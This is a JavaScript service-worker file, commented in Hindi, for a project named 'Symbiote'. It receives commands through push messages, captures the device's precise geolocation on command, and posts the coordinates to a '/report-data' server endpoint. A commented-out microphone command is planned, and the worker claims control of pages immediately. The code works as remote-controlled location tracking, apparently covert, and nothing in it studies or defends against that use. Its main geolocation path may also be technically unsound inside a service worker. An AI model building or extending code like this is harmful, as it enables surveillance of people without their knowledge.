// =================================================================
//  "सिम्बायोट" - सर्विस वर्कर (sw.js) - पूर्ण और विस्तृत संस्करण
// =================================================================

// यह संदेश ब्राउज़र के कंसोल में दिखाई देगा जब सर्विस वर्कर पहली बार सक्रिय होगा।
console.log('[Symbiote] सर्विस वर्कर सक्रिय है और कमांड के लिए तैयार है।');

// -----------------------------------------------------------------
//  इवेंट लिस्नर 1: 'push' इवेंट
//  यह तब चलता है जब आपके सर्वर (server.js) से कोई पुश नोटिफिकेशन (कमांड) आता है।
// -----------------------------------------------------------------
self.addEventListener('push', event => {
    console.log('[Symbiote] सर्वर से एक नया पुश कमांड प्राप्त हुआ।');

    let commandData;
    try {
        // पुश नोटिफिकेशन के साथ भेजे गए डेटा (कमांड) को पढ़ें
        commandData = event.data.json();
        console.log('[Symbiote] प्राप्त कमांड:', commandData);
    } catch (e) {
        console.error('[Symbiote] कमांड को JSON के रूप में पढ़ने में विफल:', e);
        return; // अगर कमांड सही नहीं है तो आगे कुछ न करें
    }

    // यह सुनिश्चित करने के लिए कि कमांड सही प्रारूप में है
    if (commandData && commandData.command) {
        
        // waitUntil यह सुनिश्चित करता है कि ब्राउज़र इस काम के पूरा होने तक
        // सर्विस वर्कर को बंद नहीं करेगा।
        const promiseChain = executeCommand(commandData);
        event.waitUntil(promiseChain);

    } else {
        console.log('[Symbiote] प्राप्त पुश डेटा में कोई वैध कमांड नहीं मिला।');
    }
});

// -----------------------------------------------------------------
//  कमांड को निष्पादित करने वाला मुख्य फंक्शन
// -----------------------------------------------------------------
function executeCommand(commandData) {
    switch (commandData.command) {
        case 'get_location':
            return executeGetLocation();

        // आप भविष्य में और कमांड यहाँ जोड़ सकते हैं
        // case 'start_mic':
        //     return executeStartMic();

        default:
            console.log(`[Symbiote] अज्ञात कमांड: ${commandData.command}`);
            return Promise.resolve(); // अज्ञात कमांड के लिए एक खाली वादा लौटाएं
    }
}

// -----------------------------------------------------------------
//  लोकेशन प्राप्त करने का फ़ंक्शन (अब ज़्यादा सुरक्षित और विस्तृत)
// -----------------------------------------------------------------
function executeGetLocation() {
    console.log('[Symbiote] लोकेशन प्राप्त करने का प्रयास कर रहा है...');

    // सर्विस वर्कर में जियोलोकेशन API तक पहुँचने के लिए एक वादा (Promise) बनाएँ
    return new Promise((resolve, reject) => {

        // जाँच करें कि जियोलोकेशन उपलब्ध है या नहीं
        if (self.navigator && self.navigator.geolocation) {
            
            self.navigator.geolocation.getCurrentPosition(
                // सफलता का कॉलबैक
                (position) => {
                    const locationData = {
                        type: 'location',
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    console.log('[Symbiote] लोकेशन मिली:', locationData);
                    
                    // मिली हुई लोकेशन को सर्वर पर भेजें और वादे को पूरा करें
                    resolve(sendDataToServer(locationData));
                },
                // त्रुटि का कॉलबैक
                (error) => {
                    console.error('[Symbiote] लोकेशन प्राप्त करने में त्रुटि:', error);
                    const errorData = {
                        type: 'error',
                        message: `लोकेशन प्राप्त करने में विफल: ${error.message}`
                    };
                    
                    // त्रुटि की जानकारी भी सर्वर को भेजें और वादे को पूरा करें
                    resolve(sendDataToServer(errorData));
                },
                // जियोलोकेशन के विकल्प
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );

        } else {
            // अगर जियोलोकेशन उपलब्ध नहीं है
            console.error('[Symbiote] इस सर्विस वर्कर में जियोलोकेशन समर्थित नहीं है।');
            const errorData = {
                type: 'error',
                message: 'सर्विस वर्कर में जियोलोकेशन समर्थित नहीं है।'
            };
            
            // त्रुटि की जानकारी सर्वर को भेजें और वादे को पूरा करें
            resolve(sendDataToServer(errorData));
        }
    });
}


// -----------------------------------------------------------------
//  हेल्पर फंक्शन: इकट्ठा किए गए डेटा को सर्वर पर भेजना
// -----------------------------------------------------------------
function sendDataToServer(data) {
    console.log('[Symbiote] डेटा सर्वर पर भेजा जा रहा है:', data);
    
    // fetch API का उपयोग करके सर्वर के '/report-data' एंडपॉइंट पर POST रिक्वेस्ट भेजें
    // यह एक वादा (Promise) लौटाता है, जो waitUntil के लिए ज़रूरी है
    return fetch('/report-data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(response => {
        if (response.ok) {
            console.log('[Symbiote] डेटा सफलतापूर्वक सर्वर पर भेजा गया।');
        } else {
            console.error('[Symbiote] सर्वर पर डेटा भेजने में विफल। Status:', response.status);
        }
    })
    .catch(error => {
        console.error('[Symbiote] सर्वर पर डेटा भेजने में नेटवर्क त्रुटि:', error);
    });
}


// -----------------------------------------------------------------
//  इवेंट लिस्नर 2: 'install' इवेंट (अपरिवर्तित)
// -----------------------------------------------------------------
self.addEventListener('install', event => {
    console.log('[Symbiote] इंस्टॉल हो रहा है...');
    self.skipWaiting();
});

// -----------------------------------------------------------------
//  इवेंट लिस्नर 3: 'activate' इवेंट (अपरिवर्तित)
// -----------------------------------------------------------------
self.addEventListener('activate', event => {
    console.log('[Symbiote] सक्रिय हो रहा है और कंट्रोल ले रहा है...');
    event.waitUntil(clients.claim());
});
